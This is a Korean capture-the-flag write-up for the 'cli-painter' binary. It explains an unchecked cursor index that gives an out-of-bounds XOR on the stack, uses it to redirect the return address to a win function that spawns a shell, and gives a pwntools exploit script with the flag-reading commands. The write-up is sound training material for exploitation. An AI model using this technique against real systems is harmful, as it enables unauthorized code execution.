# cli-painter

# Usage

# Concept
- oob

# Writeup
```
$ ./main
◎░▓▓▓░░░░░░░░░░░░░░░▓▓▓░░
░░▓▓▓░░░░░░░░░░░░░░░▓▓▓░░
░░▓▓▓░░░░░░░░░░░░░░░▓▓▓░░
░░▓▓▓░░░░░░░░░░░░░░░▓▓▓░░
░░▓▓▓░▓▓▓▓▓▓▓▓▓▓▓▓▓░▓▓▓░░
░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░
░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░
░░▓▓▓▓▓░░░░░░░░░░░░▓▓▓▓▓░
░▓▓▓▓▓░░░░░░░░░░░░░░▓▓▓▓░
░▓▓▓▓░░░░░░░░░░░░░░░▓▓▓░░
░▓▓▓▓░░░░░░░░░░░░░░░▓▓▓░░
░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░
░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░
░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░
░░▓▓▓▓▓▓░░░░░░░░░░░░▓▓▓░░
░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░▓▓▓░░
░░▓▓▓░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░
░░▓▓▓░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░
░░▓▓▓░░░░░░░░░░░░░░▓▓▓▓▓░
░░▓▓▓░░░░░░░░░░░░░░░▓▓▓▓░
░░▓▓▓░░░░░░░░░░░░░░▓▓▓▓▓░
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░▓▓▓░░
░░▓▓▓░░░░░░░░░░░░░░░▓▓▓░░
```

문제를 실행하면, 위와같은 hspace 아스키 아트가 뜬다. 사용자는 w,a,s,d 를 통해 골뱅이모양 커서를 이동시킬 수 있고, 스페이스바를 눌러 현재 커서의 위치에 있는 블록모양을 바꿀 수 있다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  game();
  return 0;
}
```

main 함수에서 game 함수를 호출한다. init 함수는 아무 동작도 하지 않는 빈 함수다.

```c
void __fastcall game(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int8 v6[72]; // [rsp+0h] [rbp-70h] BYREF
  int v7; // [rsp+48h] [rbp-28h]
  __int16 v8; // [rsp+4Ch] [rbp-24h]
  char v9; // [rsp+4Eh] [rbp-22h]
  int idx; // [rsp+5Ch] [rbp-14h]
  char v11; // [rsp+63h] [rbp-Dh]
  int v12; // [rsp+64h] [rbp-Ch]
  int v13; // [rsp+68h] [rbp-8h]
  int v14; // [rsp+6Ch] [rbp-4h]
    // ***** [1] *****
  *v6 = 0x70E0003870001CLL;
  *&v6[8] = 0x877FFDC38000E1C0LL;
  *&v6[16] = 0x3E3FFFFF0FFFFFLL;
  *&v6[24] = 0x78E0003CF0003E7CLL;
  *&v6[32] = 0xFFFFE3FFFFF1C000LL;
  *&v6[40] = 0xFE1C003F0FFFFF87LL;
  *&v6[48] = 0xFFFF387FFFDC3BFFLL;
  *&v6[56] = 0x1C78000E3E00071LL;
  *&v6[64] = 0x9FFFFFCFFFFFEF80LL;
  v7 = 473694207;
  v8 = 28672;
  ...
  enableRawMode();
  printGrid(v6, 0, 0);
  v12 = 0;
  // ***** [2] *****
  while ( 1 )
  {
    v11 = getchar();
    idx = 25 * v13 + v14;
    if ( v11 == 32 )
    {
      v6[idx / 8] ^= 1 << (idx & 7);
      goto LABEL_13;
    }
    if ( v11 >= 32 && v11 <= 119 && v11 >= 97 )
    {
      switch ( v11 )
      {
        case 'a':
          --v14;
          break;
        case 'd':
          ++v14;
          break;
        case 'q':
          disableRawMode();
          v12 = 1;
          break;
        case 's':
          ++v13;
          break;
        case 'w':
          --v13;
          break;
        default:
          continue;
      }
LABEL_13:
      printf("\x1B[H\x1B[J");
      printGrid(v6, v14, v13);
      if ( v12 )
        break;
    }
  }
}
```
맨 처음, `[1]` 부분에서 맵 데이터값을 배열에 넣는다. 이 값들은 출제자가 직접 아스키 아트로 그린 hspace 로고다.
`[2]` 부분에서 반복문을 돌려 입력을 받은 뒤, 입력값에 따라 v14, v13 값을 업데이트한다.
입력값이 공백일 경우, 25 * v13 * v14 값을 인덱스 변수에 넣은 뒤, 나누기 8 한 값을 행(바이트)으로, 나머지 8 한 값을 열(비트)로 v6 변수에 접근해 해당 위치의 비트를 1과 xor 시킨다.
q 를 누를경우 반복문을 벗어난다. 이 때, 인덱스 값에 대한 검증이 없기에 oob xor 기능을 이용하여 스택에 있는 값들을 원하는대로 수정할 수 있다.

```c
  __int8 v6[72]; // [rsp+0h] [rbp-70h] BYREF
```
map 역할을 하는 v6 변수의 위치는 `rbp-0x70` 에 위치하고, 리턴주소는 `rbp+8` 에 위치한다, 리턴주소까지의 거리는 0x78 이므로
s 를 40번, a 를 40번 입력한다면 25 * 40 - 40 == 120 ( 0x78 ) 위치로 커서를 옮길 수 있다.

```
gef➤  disas win
Dump of assembler code for function win:
   0x00000000000015b6 <+0>:	endbr64
   0x00000000000015ba <+4>:	push   rbp
   0x00000000000015bb <+5>:	mov    rbp,rsp
   0x00000000000015be <+8>:	lea    rax,[rip+0xaaf]        # 0x2074
   0x00000000000015c5 <+15>:	mov    rdi,rax
   0x00000000000015c8 <+18>:	call   0x10c0 <system@plt>
   0x00000000000015cd <+23>:	nop
   0x00000000000015ce <+24>:	pop    rbp
   0x00000000000015cf <+25>:	ret
gef➤  disas main
Dump of assembler code for function main:
   0x00000000000015d0 <+0>:	endbr64
   0x00000000000015d4 <+4>:	push   rbp
   0x00000000000015d5 <+5>:	mov    rbp,rsp
   0x00000000000015d8 <+8>:	mov    eax,0x0
   0x00000000000015dd <+13>:	call   0x1209 <init>
   0x00000000000015e2 <+18>:	mov    eax,0x0
   0x00000000000015e7 <+23>:	call   0x13d3 <game>
   0x00000000000015ec <+28>:	mov    eax,0x0
   0x00000000000015f1 <+33>:	pop    rbp
   0x00000000000015f2 <+34>:	ret
End of assembler dump.
gef➤
```
v6 변수가 위치한 game 함수의 리턴주소는 0x15ec 이고, win 함수의 주소는 0x15b6 이다. 하지만 win 함수로 리턴주소를 변조해 호출해보면 stack align 에러가 나서 터지는걸 볼 수 있다. 그래서 push rbp 이후인 0x15bb 로 리턴해줘야한다.
`0x15ec ^ 0x15bb == 0b1010111` (87) 이므로, 리턴 주소까지 커서를 움직인 뒤, ` d d dd dd q` 를 차례대로 입력해 87과 xor 하면 리턴주소가 win+4 으로 조작되고 반복문이 종료되어 쉘을 획득할 수 있다. 아래는 익스파일이다.

```python
from pwn import *

r = remote("localhost",39393)

payload = b"s"*40 + b"a"*40
payload += b" d d dd dd "
payload += b"q"
payload = payload
r.recv()
r.send(payload)
r.recvline()

r.interactive()
```
쉘이 실행되고, tty 설정때문에 단순 쉘 명령어 실행결과가 보이지않을 수 있다.
`stty raw -echo` 명령어를 입력해 정상적으로 명령어 실행결과를 볼 수 있다.
`cat /home/cli-painter/flag.txt` 명령어를 실행하면 플래그를 얻을 수 있다.